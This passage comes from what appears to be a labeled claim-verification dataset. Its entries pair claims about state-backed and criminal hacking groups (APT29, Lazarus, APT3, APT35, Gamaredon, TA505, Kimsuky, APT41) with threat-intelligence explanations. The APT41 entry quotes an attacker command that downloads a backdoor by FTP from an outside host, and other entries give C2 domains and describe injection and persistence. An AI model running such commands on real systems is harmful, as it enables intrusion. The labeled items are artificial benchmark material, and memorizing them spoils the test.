        "explain": "The Dutch General Intelligence and Security Service (AIVD) inferred from security camera footage that it is led by the Russian Foreign Intelligence Service (SVR); the US agrees. CrowdStrike, a cybersecurity firm, previously speculated that the group might be linked to the Russian Federal Security Service (FSB). CozyCar, CozyDuke (by F-Secure), Dark Halo, The Dukes (by Volexity), NOBELIUM, Office Monkeys, StellarParticle, UNC2452, and YTTRIUM are some of the nicknames given to the group by different cybersecurity research groups.Cozy Bear is a well-resourced, highly dedicated, and structured cyberespionage operation that we believe has been operating for the Russian Federation since at least 2008 to collect intelligence in support of foreign and security policy decision-making,’ according to a 2015 assessment from F-Secure. Cozy Bear has an unusual amount of faith in its ability to keep effectively compromising its targets, as well as in its ability to operate without being detected.APT29 and another Russian APT group called APT28 (Fancy Bear) infiltrated the Democratic National Committee’s (DNC) network and caused a data breach, which started in 2015 but was detected in 2016.ESET investigates Operation Ghost, which is believed to have started in 2013 and affected the Ministry of Foreign Affairs of some European countries. ESET also reports that the group has developed new malware families called the PolyglotDuke, RegDuke, and FatDuke. Later on, the WellMess malware was observed in attacks against Japanese firms in 2018; however, it was not linked to a specific threat actor then. WellMess was linked to Russia’s APT29 in 2020 when the US, UK, and Canada stated Russian hackers used it in attacks against academic and pharmaceutical research institutes involved in developing the COVID-19 vaccine.APT29, who are the hackers behind the SolarWinds software supply chain attack and the attacks mentioned above, have continued to look for ways to access enterprise networks by targeting IT and cloud services providers with admin rights on their customers’ systems due to their business connection. In a new report, Microsoft warns that the gang has targeted over 140 cloud service resellers and technology suppliers since May and has succeeded in compromising as many as 14. Moreover, Cozy Bear is the hacker behind the SolarWinds software supply chain attack. Denmark National Bank has been another victim of the notorious group’s SolarWinds attack. According to a report published in May 2021, Cozy Bear attacked Denmark’s central bank (Denmark’s National Bank) and planted malware that allowed them to access the network for over six months without being noticed. The SolarWinds campaign is regarded as one of the most sophisticated supply-chain hacks, with 18,000 businesses worldwide downloading trojanized versions of the IT management platform SolarWinds Orion. Despite the hackers’ long-term access, the bank said it found no sign of breach beyond the first stage of the attack, as thousands of other companies did when they installed the trojanized version of SolarWinds Orion.In a blog shared by Microsoft Threat Intelligence Center (MSTIC) in 2021, researchers noted that APT29 has been using the EnvyScout, BoomBox, NativeZone, and VaporRage malware families for its email-based attacks since February 2021, which aims to gain a foothold on various sensitive diplomatic and government entities. In December 2021, ANSSI shared a threat and incident report of the French national government computer security incident response team (CERTFR). The ANSSI stated that French organizations had been subjected to phishing attacks since February 2021, and the identified TTPs overlapped with the SolarWinds supply chain attack.In April 2022, a lure document that allegedly belonged to APT29 was found, which contained a malicious script and appeared to have been created by the Israeli Embassy.In January 2022, Crowdstrike shared a blog about a campaign called StellarParticle linked to Cozy Bear. The campaign, conducted with GoldMax and TrailBlazer malware, reveals that since mid-2019, APT29 has used an MFA bypass to access Office 365 accounts with stolen cookies.Cybersecurity researchers observed that the group uses social media platforms (Twitter, Reddit, etc.) or various internet services (Trello, Firebase, etc.) as C2 (Command & Control) communication during its activities. In the group’s latest campaign, it was found that they have been using the API of Notion, a note-taking application. Based on the group’s latest campaign details, APT29 used the Polish Foreign Minister‘s recent visit to the US as a lure to conduct a spear phishing campaign targeting Western Countries, particularly Western Europe. The lure document contains a link to download an HTML file from a legitimate online library the group had actively used in its other attacks between January 2023 to February 2023. Another observed lure document abuses multiple legitimate systems, such as LegisWrite and eTrustEx, which EU nations use to exchange information and transfer data securely. Using these programs shows that the group targets state organizations within the EU.\n\n\n",

        "claim": "The document describes the Vyveva backdoor attack by the Lazarus Group, targeting a freight logistics company in South Africa, featuring capabilities like file exfiltration and computer surveillance, and using the Tor network for communication.",
        "original_label": "true",
        "label": "true",
        "explain": "ESET researchers have discovered a previously undocumented Lazarus backdoor, which they have dubbed Vyveva, being used to attack a freight logistics company in South Africa. The backdoor consists of multiple components and communicates with its C&C server via the Tor network. So far, we have been able to find its installer, loader and main payload – a backdoor with a TorSocket DLL. The previously unknown attack was discovered in June 2020. Although Vyveva has been used since at least December 2018, its initial compromise vector is still unknown. Our telemetry data suggests targeted deployment as we found only two victim machines, both of which are servers owned by a freight logistics company located in South Africa. The backdoor features capabilities for file exfiltration, timestomping, gathering information about the victim computer and its drives, and other common backdoor functionality such as running arbitrary code specified by the malware’s operators. This indicates that the intent of the operation is most likely espionage. This blogpost provides the first public, technical analysis of Vyveva’s components. Vyveva shares multiple code similarities with older Lazarus samples that are detected by ESET products as the NukeSped malware family. However, the similarities do not end there: the use of fake TLS in network communication, command line execution chains, and the way of using encryption and Tor services all point towards Lazarus; hence we can attribute Vyveva to this APT group with high confidence. An example of the numerous code similarities can be seen in Figure 1 – resolving uniquely named Tor library exports. Up until now, we have managed to find three of the multiple components comprising Vyveva – its installer, loader and backdoor. The installer is the earliest chronological stage found and since it expects other components to be already present on the machine, it suggests the existence of an earlier, unknown stage – a dropper. The loader serves to decrypt the backdoor using a simple XOR decryption algorithm. Figure 2 provides a closer look at the functionality of the installer, the backdoor, and the Tor library. The main purposes of the installer are twofold: it creates a service that ensures persistence of the backdoor loader, and it stores the embedded, default backdoor configuration in the registry. To create a legitimate-looking service, its attributes, such as service name and display name, are formed using a combination of words from the attributes of existing services, which are randomly selected. It is also possible to specify these attributes to the installer via command line parameters - dll, -svc, -disp, -desc, and -group. We observed the following in the wild, with these parameters: As for the latter task, the installer first sets the configuration infection ID, which uniquely identifies each victim, to a randomly generated value, and then stores it in the registry, as shown in Figure 3. One of the entries in the configuration is a list of encrypted C&C servers: for example, the installer sample we analyzed is configured with the following C&Cs: The backdoor, Vyveva’s main component, connects to C&C servers and executes commands issued by the threat actors. It features 23 commands, some of which are asynchronous and executed in their own threads. Most of them are ordinary commands for file and process operations or information gathering, but there is also a less common command for file timestomping. It can copy creation/write/access time metadata from a “donor” file to a destination file or use a random date in the years 2000—2004. Other noteworthy commands are Vyveva’s file upload command, and command 0x26. The file upload command is capable of exfiltrating directories recursively and supports file extension filtering – for example, Office documents only. As for command 0x26, it indicates the existence of another, unknown component that we have not yet observed at the time of writing. The full list of commands is shown in Table 1. Of particular interest are the backdoor’s watchdogs, which can be optionally enabled or disabled. There is a drive watchdog used to monitor newly connected and disconnected drives, and a session watchdog monitoring the number of active sessions (i.e. logged-on users). These components can trigger a connection to the C&C server outside the regular, preconfigured three-minute interval, and on new drive and session events. The configuration of the backdoor, which is initially set by the installer, is read from the registry value (shown in Figure 3). When the configuration is modified by a C&C command, the value stored in the registry is updated. An example configuration and its structure are shown in Figure 4. The wait_minutes field specifies the time to wait before next connection to the C&C after a failed connection attempt. If the execution of the backdoor needs to be delayed until a particular time and date, it can be specified in the delay_until_time field. The encrypted_cncs field is an encrypted string, which contains semicolon-separated C&Cs. Vyveva uses the Tor library, which is based on the official Tor source code, to communicate with a C&C server selected at random from the configuration. It contacts the C&C at three-minute intervals, sending information about the victim computer and its drives before receiving commands. The backdoor’s export directory contains the TorSocket.dll with self-explanatory exports close_ch, connect_ch, open_ch, read_ch, write_ch.Vyveva constitutes yet another addition to Lazarus’s extensive malware arsenal. Attacking a company in South Africa also illustrates the broad geographical targeting of this APT group.

        "claim": "APT3 is a China-based threat group that researchers have attributed to China's Ministry of State Security.",
        "original_label": "true",
        "label": "true",
        "explain": "APT3 (aka Gothic Panda, Pirpi, Buckeye) is a China-based threat group that was first discovered in 2010. The group is linked to the Chinese Ministry of State Security (China's Intelligence Services) and held responsible for several popular cyber espionage campaigns, including Operation Clandestine Wolf (2015), Clandestine Fox (2014), and Double Tap (2014). The group is known to target countries like South Korea, Hong Kong, and the United States of America.APT3 has targeted organizations in various sectors, including Aerospace, Defense, Transportation, Telecommunications, Construction Engineering, and High Tech. In the initial years of its discovery, the group mostly targeted US-based organizations of strategic importance, like Moody's Analytics, Siemens AG, and Trimble, Inc. In 2015, the group shifted its focus from US victims to political organizations located in Hong Kong (because of upcoming Hong Kong’s 2016 elections). In March 2018, the Olympic Winter Games in Pyeongchang, South Korea, was hit by a cyber attack (OlympicDestroyer), that caused temporary disruption to IT systems, including the official Olympics website, Wi-Fi connections and display monitors. The numerous code fragments used in that cyber attack were uniquely linked to threat actor groups tracked as APT3, APT10, and APT12.The group is known to steal critical information from private organizations or government entities, to fulfill the larger Chinese political economic or military goals. The threat actors are interested in the exfiltration of essential government documents to gain a strategic and competitive advantage for the Chinese government and private organizations. For instance, at present when several ambitious projects of China are unfolding, like One Belt One Road (OBOR) projects, the APT3 could be seen targeting the project’s regional opponents.APT3 has a history of using browser-based exploits such as zero-days (e.g., Adobe Flash Player, Firefox, and Internet Explorer) to infiltrate inside the targeted network. For instance, in one of their cyber campaigns in April 2014 (Operation Clandestine Wolf), they exploited a now-patched vulnerability (CVE-2015-3113) in Adobe Flash Player 18.0.0.161. After successfully exploiting and infiltrating into a targeted host, they quickly dump credentials, move sideways to additional hosts, and install the custom backdoors (like RemoteCMD, OSInfo, and ShotPut). APT3 is also known to use spear-phishing emails with compressed executable attachment. The APT's command and control (CnC) infrastructure is hard to track and attribute, as there is little overlap across their campaigns (as it happened only once when the same domain was used in operation Clandestine Fox and Double Tap).APT3 utilizes a wide range of techniques and tools, including spearphishing attacks, zero-day exploits, as well as custom-built malware. The group also used variants of the sophisticated hacking tools connected to other popular groups, including the Equation Group.In 2016, three individuals responsible for purchasing APT3 domains for cyber-espionage campaigns were identified, named as Wu Yingzhuo, Dong Hao and Xia Lei. All three individuals had a long history of purchasing infrastructure used by APT3. Wu Yingzhuo and Dong were the major shareholders of a Chinese InfoSec company called the Guangzhou Boyu Information Technology Company, Ltd. (Boyusec). The Pentagon intelligence officials identified Boyusec as being a contractor for the Chinese Ministry of State Security (MSS). In Nov 2017, an indictment was unsealed in the USA against them.To thwart off cyber-attacks from threats like APT3, the organizations should deploy endpoint protection solutions with real-time intelligence and automated tactical threat intelligence exchange. Given the prevalence of attacks used by APT3 that exploit known vulnerabilities, rigorous patch management, and vulnerability assessments practices are a must. Combating APTs like this requires a combination of techniques and tools that ideally work in an orchestrated manner. Orchestration tools that allow real-time Threat Intel ingestion, analysis, correlation, dissemination and actioning through automated Playbooks can go a long way in tackling the nefarious designs of such APTs. Network monitoring can also help expose suspicious activities, like using network APT detection solutions can help detect custom malware used by APT3. The APT3 is also known to use spear-phishing, which could be prevented via giving proper training to IT professionals and employees with phishing simulations, tough policies and periodic refreshers that discourage unsafe behaviors.\n\n\n",

        "claim": "APT35, also known as “Charming Kitten,” was discovered in a corporate environment, where it had infiltrated a device via spear-phishing, exhibiting minimal activity to avoid detection until identified by Darktrace's AI.",
        "original_label": "true",
        "label": "true",
        "explain": "APT35, sometimes referred to as Charming Kitten, Imperial Kitten, or Tortoiseshell, is a notorious cyber-espionage group which has been active for nearly 10 years. Famous for stealing scripts from HBO’s Game of Thrones in 2017 and suspected of interfering in the U.S. presidential election last year, it has launched extensive campaigns against organizations and officials across North America and the Middle East. Public attribution has associated APT35 with an Iran-based nation state threat actor. Darktrace regularly detects attacks by many known threat actors including Evil Corp and APT41, alongside large amounts of malicious but uncategorized activity from sophisticated attack groups. As Cyber AI doesn’t rely on predefined rules, signatures, or threat intelligence to detect cyber-attacks, it often detects new and previously unknown threats. This blog post examines a real-world instance of APT35 activity in an organization in the EMEA region. Darktrace observed this activity last June, but due to ongoing investigations, details are only now being released with the wider community. It represents an interesting case for the value of self-learning AI in two key ways: APT35 had already infected a single corporate device, likely via a spear phishing email, when Cyber AI was deployed in the company’s digital estate for the first time. The infected device exhibited no other signs of malicious activity beyond continued command and control (C2) beaconing, awaiting instructions from the attackers for several days. This is what we call ‘lying low’ – where the hacker stays present within a system, but remains under the radar, avoiding detection either intentionally, or because they’re focusing on another victim while being content with backdoor access into the organization. Either way, this is a nightmare scenario for a security team and any security vendor: an APT which has established a foothold and is lying in wait to continue their attack – undetected.When Darktrace’s AI was first activated, it spent five business days learning the unique ‘patterns of life’ for the organization. After this initial, short learning period, Darktrace immediately flagged the infected device and the C2 activity. Although the breach device had been beaconing since before Darktrace was implemented, Cyber AI automatically clusters devices into ‘peer groups’ based on similar behavioral patterns, enabling Darktrace to identify the continued C2 traffic coming from the device as highly unusual in comparison to the wider, automatically identified peer group. None of its behaviorally close neighbors were doing anything remotely similar, and Darktrace was therefore able to determine that the activity was malicious, and that it represented C2 beaconing. Darktrace detected the APT35 C2 activity without the use of any signatures or threat intelligence on multiple levels. Responding to the alerts, the internal security team quickly isolated the device and verified with the Darktrace system that no further reconnaissance, lateral movement, or data exfiltration had taken place. Once the C2 was detected, Cyber AI Analyst immediately began analyzing the infected device. The Cyber AI Analyst only highlights the most severe incidents in any given environment and automates many of the typical level one and level two SOC tasks. This includes reviewing all alerts, investigating the scope and nature of each event, and reducing time to triage by 92% Numerous factors made the C2 activity stand out strongly to Darktrace. Combining all those small anomalies, Darktrace was able to autonomously prioritize this behavior and classify it as the most significant security incident in the week. Some of the command and control destinations were known to threat intelligence and open-source intelligence (OSINT) – for instance, the domain cortanaservice[.]com is a known C2 domain for APT35. However, the presence of a known malicious domain does not guarantee detection. In fact, the organization had a very mature security stack, yet they failed to discover the existing APT35 infection until Darktrace was activated in their environment. Once an intrusion has been identified, it is important to understand the extent of it – such as whether lateral movement is occurring and what connectivity the infected device has in general. Asset management is never perfect, so it can be very hard for organizations to determine what damage a compromised device is capable of inflicting. Darktrace presents this information in real time, and from a bird’s-eye perspective, making the assessment very simple. It immediately highlights which subnet the device is located in and any further context.Based on this information, the organization confirmed that it was a corporate device that had been infected by APT35. As Darktrace shows any credentials associated with the device, a quick assessment could be made of potentially compromised accounts.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "Gamaredon is an advanced persistent threat (APT) group that has been active since 2013. Their campaigns are generally known for targeting Ukrainian government institutions. From late 2019 to February of this year, researchers published several reports on Gamaredon, tracking the group’s activities. In March, we came across an email with a malware attachment that used the Gamaredon group’s tactics. Some of the emails used the coronavirus pandemic as a topic to lure victims into opening emails and attachments. These campaigns targeted victims in European countries and others. In 2015, researchers from LookingGlass published the first report on Gamaredon. According to that report, the early campaigns used Microsoft Word documents that, when inspected, showed that its most recent user went by the name of Armagedon (a misspelled “Armageddon”), which became the basis of the group’s namesake. The report also described Gamaredon’s political beginnings, particularly its ties to the Ukrainian revolution in 2014. Before the revolution they had targeted Ukrainian government officials, opposition party members, and journalists. They moved on to Ukrainian government institutions after the revolution. In 2018, CERT-UA published an advisory against the malware Pterodo, which the group allegedly used. The group remained active, with several Gamaredon-related activities reported in February 2020. In March, they were among the threat groups that were identified taking advantage of the coronavirus pandemic to trick targets. The case we found arrived through a targeted email that contained a document file (in docx format). Opening document starts a template injection technique for loading the document template from the internet. The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS). We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server. During the time of the analysis however, the C&C server was not accessible, which made us unable to get additional payloads. The attacks we found all arrived through targeted emails (MITRE ATT&CK framework ID T1193). One of them even had the subject “Coronavirus (2019-nCoV).” The use of socially relevant topics is a common practice for attackers who wish to make their emails and documents more tempting to open. The email that used the coronavirus-related subject came with an attached document file. Opening this file (MITRE ATT&CK framework ID T1204) executes the template injection method (MITRE ATT&CK framework ID T1221).The downloaded document template (in dot format) could differ slightly depending on each download. However, its Exif info or metadata remains consistent and shares the following details. As mentioned, the template contains malicious macro (MITRE ATT&CK framework ID T1064), which exports VBS (MITRE ATT&CK framework ID T1064) to execute itself. More specifically it drops “%USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs,” which is hardcoded in the macro, and then executed in “wscript.exe //b %USERPROFILE%\\Documents\\MediaPlayer\\PlayList.vbs.” PlayList.vbs contains the obfuscated codes (MITRE ATT&CK framework ID T1140), which it executes after decrypting the obfuscations. This particular behavior is a slight departure from previously reported attacks by Gamaredon, which did not use this technique.The observed routines of this VBS closely follow the other reports published on Gamaredon, such as the one from SentinelOne. However, the macro generated VBS was obfuscated in this case, likely as an additional evasive tactic. Interestingly, after decoding the VBS, we saw what appeared to be a programming mistake by the attacker. Lines 53 and 54 in figure 6 are for closing those downloaded and decoded TXT and EXE files, which are variables defined right before the IF statement. If, however, these lines do not pass through this IF statement, an error would occur. It shows that this malware is not tested enough, and may still be under development. Our analysis found several URLs of the network destinations for both template injection and VBS. While resolving them to IP addresses to understand their attack bases, we also found that they were all linked to the following IP addresses.These IP addresses are from Russian hosting companies. Most likely, the attackers rented Virtual Private Server (VPS) as their attack base. Their URL for VBS (shown below) likely includes the data when they conducted the attack.Gameradon is not the first group to take advantage of the Covid-19 topic. Some cybercriminals have taken to indirect means of profiting, such as by targeting communication platforms that have increased in popularity after organizations shifted to work from home setups. In this case, they used Covid-19 as a cover for their relatively typical APT routine. We recommend these countermeasures to prevent similar APT attacks in the future.\n\n\n",

Active since at least 2013, Shuckworm specializes in cyber-espionage mainly against Ukrainian entities, utilizing phishing emails and both freely available and customized malware to infiltrate and move laterally across victim networks, with increasing sophistication over time. A case study detailed by Symantec shows the persistent and methodical approach of Shuckworm, with an attack on a Ukrainian organization from July to August 2021, initiating from a malicious document likely sent via phishing email. Technical investigations revealed that Shuckworm employs seven main types of 7-zip SFX self-extracting binaries in their attacks, which perform various malicious tasks including contacting command-and-control servers for further instructions and payload downloads. A November 2021 report by the Security Service of Ukraine (SSU) highlighted Shuckworm's extensive impact, attributing over 5000 attacks to the group since 2014, impacting more than 1500 Ukrainian government systems. Despite ongoing efforts and awareness, Shuckworm's activities against Ukrainian targets remain persistent and show little signs of diminishing, reflecting the group's established and evolving tactics in cyber-espionage.",

        "claim": "TA505 is a cybercrime group known for ransomware attacks and evolving from phishing to exploiting vulnerabilities like SolarWinds Serv-U for initial access.",
        "original_label": "true",
        "label": "true",
        "explain": "NCC Group’s global Cyber Incident Response Team has observed an increase in Clop ransomware victims in the past weeks. The surge can be traced back to a vulnerability in SolarWinds Serv-U that is being abused by the TA505 threat actor. TA505 is a known cybercrime threat actor, who is known for extortion attacks using the Clop ransomware. We believe exploiting such vulnerabilities is a recent initial access technique for TA505, deviating from the actor’s usual phishing-based approach. NCC Group strongly advises updating systems running SolarWinds Serv-U software to the most recent version (at minimum version 15.2.3 HF2) and checking whether exploitation has happened as detailed below. We are sharing this information as a call to action for organisations using SolarWinds Serv-U software and incident responders currently dealing with Clop ransomware. During multiple incident response investigations, NCC Group found that a vulnerable version of SolarWinds Serv-U server appeared to be the initial access used by TA505 to breach its victims’ IT infrastructure. The vulnerability being exploited is known as CVE-2021-35211 [1]. SolarWinds published a security advisory [2] detailing the vulnerability in the Serv-U software on July 9, 2021. The advisory mentions that Serv-U Managed File Transfer and Serv-U Secure FTP are affected by the vulnerability. On July 13, 2021, Microsoft published an article [3] on CVE-2021-35211 being abused by a Chinese threat actor referred to as DEV-0322. Here we describe how TA505, a completely different threat actor, is exploiting that vulnerability. Successful exploitation of the vulnerability, as described by Microsoft [3], causes Serv-U to spawn a subprocess controlled by the adversary. That enables the adversary to run commands and deploy tools for further penetration into the victim’s network. Exploitation also causes Serv-U to log an exception, as described in the section below on checks for potential compromise. We observed that Base64 encoded PowerShell commands were logged shortly after the Serv-U exceptions indicating exploitation. The PowerShell commands ultimately led to deployment of a Cobalt Strike Beacon on the system running the vulnerable Serv-U software. The PowerShell command observed deploying Cobalt Strike was: On several occasions the threat actor tried to maintain its foothold by hijacking a scheduled task named RegIdleBackup and abusing the COM handler associated with it to execute malicious code, leading to FlawedGrace RAT. The RegIdleBackup task is a legitimate task that is stored in \\Microsoft\\Windows\\Registry. The task is normally used to regularly backup the registry hives. By default, the CLSID in the COM handler is set to: {CA767AA8-9157-4604-B64B40747123D5F2}. In all cases where we observed the threat actor abusing the task for persistence, the COM handler was altered to a different CLSID. CLSID objects are stored in registry in HKLM\\SOFTWARE\\Classes\\CLSID. In our investigations the task included a suspicious CLSID, which subsequently redirected to another CLSID. The second CLSID included three objects containing the FlawedGrace RAT loader. The objects contain Base64 encoded strings that ultimately lead to the executable. NCC Group recommends looking for potentially vulnerable Serv-U FTP-servers in your network and checking these logs for traces of similar exceptions as suggested by the SolarWinds security advisory. It is important to note that the publications by Microsoft and SolarWinds describe follow-up activity regarding a completely different threat actor than we observed in our investigations. Microsoft’s article [3] on CVE-2021-35211 provides guidance on the detection of the abuse of the vulnerability. The first indicator of compromise for the exploitation of this vulnerability are suspicious entries in a Serv-U log file named DebugSocketlog.txt. This log file is usually located in the Serv-U installation folder. Looking at this log file it contains exceptions at the time of exploitation of CVE-2021-35211. NCC Group’s analysts encountered the following exceptions during their investigations: However, as mentioned in Microsoft’s article, this exception is not by definition an indicator of successful exploitation and therefore further analysis should be carried out to determine potential compromise. Analysts should look for suspicious PowerShell commands being executed close to the date and time of the exceptions. The full content of PowerShell commands is usually recorded in Event ID 4104 in the Windows Event logs. Analysts should look for the RegIdleBackup task with an altered CLSID. Subsequently, the suspicious CLSID should be used to query the registry and check for objects containing Base64 encoded strings. The following PowerShell commands assist in checking for the existence of the hijacked task and suspicious CLSID content: The following steps should be taken to check whether exploitation led to a suspected compromise by TA505: There are currently still many vulnerable internet-accessible Serv-U servers online around the world. In July 2021 after Microsoft published about the exploitation of Serv-U FTP servers by DEV-0322, NCC Group mapped the internet for vulnerable servers to gauge the potential impact of this vulnerability. In July, 5945 (~94%) of all Serv-U (S)FTP services identified on port 22 were potentially vulnerable. In October, three months after SolarWinds released their patch, the number of potentially vulnerable servers is still significant at 2784 (66.5%). The top countries with potentially vulnerable Serv-U FTP services at the time of writing are:\n\n\n",

Initially, TA505's campaigns in September 2021 involved sending thousands of emails with specific lures and malicious Excel attachments, primarily targeting North America, with a later expansion to German-speaking regions. These early campaigns used detailed lures like legal updates and health claims, with emails containing Excel attachments that led to the download and execution of an MSI file, executing the Rebol loader named MirrorBlast. Late September and October 2021 saw a return to familiar TA505 tactics, techniques, and procedures (TTPs), with the introduction of a KiXtart intermediary loader, evolving the attack chain to involve various email lures, attachments, and download stages leading to the deployment of FlawedGrace. sTA505's updated attack strategy includes multiple intermediate loaders coded in Rebol and KiXtart, serving similar purposes to their previous Get2 downloader, performing reconnaissance and downloading further payloads, ultimately leading to FlawedGrace.",

        "original_label": "true",
        "label": "true",
        "explain": "Recently we have observed a significant increase in state-sponsored operations carried out by threat actors worldwide. APT34, Gamaredon, and Transparent Tribe are a few samples of the recently uncovered campaigns, the latter was spotted after four years of apparent inactivity. Cybaze-Yoroi ZLab decided to study in depth a recent threat attributed to a North Korean APT dubbed Kimsuky. The Kimsuky APT group has been analyzed by several security teams. It was first spotted by Kaspersky researcher in 2013, recently its activity was detailed by ESTsecurity. We decided to analysed the activity of the group after noticing a tweet of the user '@spider_girl22' in February 28th 2020.Unlike other APT groups using long and complex infection chains, the Kimsuky group leverages a shorter attack chain, but at the same time, we believe it is very effective in achieving a low detection rate. The infection starts with a classic executable file with 'scr' extension, an extension used by Windows to identify Screensaver artifacts. In the following table are reported some information about the sample.Despite the '.db' extension, the written file is actually a well formed DLL that acts as the second stage of the malware infection. Static information of DLL are shown below.The dll is then copied into the folder '%AppData%\\Roaming\\Microsoft\\Windows\\Defender\\' and it is renamed into 'AutoUpdate.dll'.The 'AutoUpdate.dll' library then gains persistence by setting the following registry key 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\WindowsDefender'. The name and the path used by the attacker is absolutely tricky, because they reference to Windows Defender. Furthermore, exploring the content of the folder '%AppData%\\Local\\Temp' path, we observed another temporary file created and immediately removed dubbed '.tmp.bat'. By analyzing its contents, we noticed that it is used to delete the initial artifact (scr) and file itself. In order to hide the malicious operation and avoid raising suspicion, a legit document is created in the same folder containing the '.scr' file, the document is named '***.hwp'. Translating its name from Korean to English language, is possible to obtain the 'CV Form' string. The name and other information about the document are the following.As implied by the file name (CV Form), the document contains a CV form with empty fields, as shown in the following figure. An interesting behaviour is the 'explorer.exe' injection performed by the 'AutoUpdate.dll' in order to avoid AVs detection. Digging in the malicious code, it is possible to see the methods used to perform this operation. First of all, the malware sets the right privileges, as reported in the following image.Once obtained the necessary privileges, the malware is able to proceed with the injection. As described by the analysis published by elastic, the malware writes the path to its malicious DLL in the virtual address space of another process through the 'VirtualAllocEx' function. In this case, the target process is 'explorer.exe', it ensures the remote process loads it by creating a remote thread inside it.To perform these operations, first of all the malware needs to know the Process ID of the target, this is performed through the navigation of all processes tree. This task can be executed using the Tool Help Library Windows API family using CreateToolhelp32Snapshot(), Process32First(), and Process32Next() API. Then, the malware calls VirtualAllocEx() to allocate a space to write the path to the malicious DLL, then it calls WriteProcessMemory() to write the DLL path inside the allocated memory. After that, the malware calls the CreateRemoteThread() API to link the thread newly created to the host process (explorer.exe). Parts of the described logic are shown in the below figure.Two components are implanted in the 'explorer.exe' process. In the following tables are presented some information about the two DLLs extracted. Comparing the ssdeep of the two DLLs is possible to notice several overlaps between the two libraries, a circumstance that confirms a high 'similarity' between them. Below are highlighted the different portions of the hash.There are tiny differences between the DLLs as shown below performing a simple binary diffing analysis. Due to these differences between the two DLLs, we decided to continue the analysis on one of them. Digging into the DLL, we notice that every time a function has to be performed by the malware, it relies on a recurrent decryption routine, which decodes the strings containing the actual instruction and executes it. An example of the decryption routine is reported in the following figure on top right.Every 15 minutes, the malware contacts the C2 (suzuki.]datastore.]pe.]hu) and sends back the information about the compromised machine, as reported in the previous figure. In particular, three HTTP requests are made using different URLs paths and different User-Agent fields for each request. An example of the C2 registration is the following.During our Threat Intelligence activities, we discovered a new malware implant compatible with the previous campaigns of Kimsuky APT actor. According to the ESTsecurity firm, the initial dropper contains two malicious resources embedding the malicious DLLs, however, in our sample there aren’t. Despite these little differences, we can affirm with good confidence that the Threat Actor is Kimsuky due to strong similarities with the TTPs.\n\n\n",

        "claim": "Chinese cyber espionage group APT41 initiated a global intrusion campaign by exploiting vulnerabilities in multiple high-value networks.",
        "original_label": "true",
        "label": "true",
        "explain": "Beginning this year, FireEye observed Chinese actor APT41 carry out one of the broadest campaigns by a Chinese cyber espionage actor we have observed in recent years. Between January 20 and March 11, FireEye observed APT41 attempt to exploit vulnerabilities in Citrix NetScaler/ADC, Cisco routers, and Zoho ManageEngine Desktop Central at over 75 FireEye customers. Countries we’ve seen targeted include Australia, Canada, Denmark, Finland, France, India, Italy, Japan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore, Sweden, Switzerland, UAE, UK and USA. The following industries were targeted: Banking/Finance, Construction, Defense Industrial Base, Government, Healthcare, High Technology, Higher Education, Legal, Manufacturing, Media, Non-profit, Oil & Gas, Petrochemical, Pharmaceutical, Real Estate, Telecommunications, Transportation, Travel, and Utility. It’s unclear if APT41 scanned the Internet and attempted exploitation en masse or selected a subset of specific organizations to target, but the victims appear to be more targeted in nature.Starting on January 20, 2020, APT41 used the IP address 66.42.98[.]220 to attempt exploits of Citrix Application Delivery Controller (ADC) and Citrix Gateway devices with CVE-2019-19781 (published December 17, 2019).The initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved execution of the command ‘file /bin/pwd’, which may have achieved two objectives for APT41. First, it would confirm whether the system was vulnerable and the mitigation wasn’t applied. Second, it may return architecture-related information that would be required knowledge for APT41 to successfully deploy a backdoor in a follow-up step. One interesting thing to note is that all observed requests were only performed against Citrix devices, suggesting APT41 was operating with an already-known list of identified devices accessible on the internet.There is a lull in APT41 activity between January 23 and February 1, which is likely related to the Chinese Lunar New Year holidays which occurred between January 24 and January 30, 2020. This has been a common activity pattern by Chinese APT groups in past years as well. Starting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads that initiate a download via the File Transfer Protocol (FTP). Specifically, APT41 executed the command ‘/usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]/@66.42.98[.]220/bsd’, which connected to 66.42.98[.]220 over the FTP protocol, logged in to the FTP server with a username of ‘test’ and a password that we have redacted, and then downloaded an unknown payload named ‘bsd’ (which was likely a backdoor). We did not observe APT41 activity at FireEye customers between February 2 and February 19, 2020. China initiated COVID-19 related quarantines in cities in Hubei province starting on January 23 and January 24, and rolled out quarantines to additional provinces starting between February 2 and February 10. While it is possible that this reduction in activity might be related to the COVID-19 quarantine measures in China, APT41 may have remained active in other ways, which we were unable to observe with FireEye telemetry. We observed a significant uptick in CVE-2019- 19781 exploitation on February 24 and February 25. The exploit behavior was almost identical to the activity on February 1, where only the name of the payload ‘un’ changed. Citrix released a mitigation for CVE-2019-19781 on December 17, 2019, and as of January 24, 2020, released permanent fixes for all supported versions of Citrix ADC, Gateway, and SD-WAN WANOP.On February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64- bit MIPS processor named ‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown what specific exploit was used, but there is a Metasploit module that combines two CVE’s (CVE-2019-1653 and CVE-2019-1652) to enable remote code execution on Cisco RV320 and RV325 small business routers and uses wget to download the specified payload.66.42.98[.]220 also hosted a file name http://66.42.98[.]220/test/1.txt. The content of 1.txt (MD5: c0c467c8e9b2046d7053642cc9bdd57d) is ‘cat /etc/flash/etc/nk_sysconfig’, which is the command one would execute on a Cisco RV320 router to display the current configuration. Cisco PSIRT confirmed that fixed software to address the noted vulnerabilities is available and asks customers to review the following security advisories and take appropriate action: On March 5, 2020, researcher Steven Seeley, published an advisory and released proof-of-concept code for a zero-day remote code execution vulnerability in Zoho ManageEngine Desktop Central versions prior to 10.0.474 (CVE-2020-10189). Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho ManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five separate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were deployed. In the first variation the CVE-2020-10189 exploit was used to directly upload “logger.zip”, a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and 